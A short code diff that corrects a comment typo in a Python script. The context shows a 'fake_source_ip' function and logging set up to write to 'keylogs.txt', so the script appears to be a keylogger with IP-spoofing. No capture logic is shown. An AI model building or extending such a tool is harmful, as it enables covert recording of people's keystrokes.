@@ -16,7 +16,7 @@ def fake_source_ip():
     return source[:-1]
 
 
-# must be on the harddrive not in an obscure folder to work
+# must be on the hard drive not in an obscure folder to work
 # set config for the logging module
 logging.basicConfig(filename=("" + "keylogs.txt"), \
                     level=logging.DEBUG, format='%(asctime)s: %(message)s')
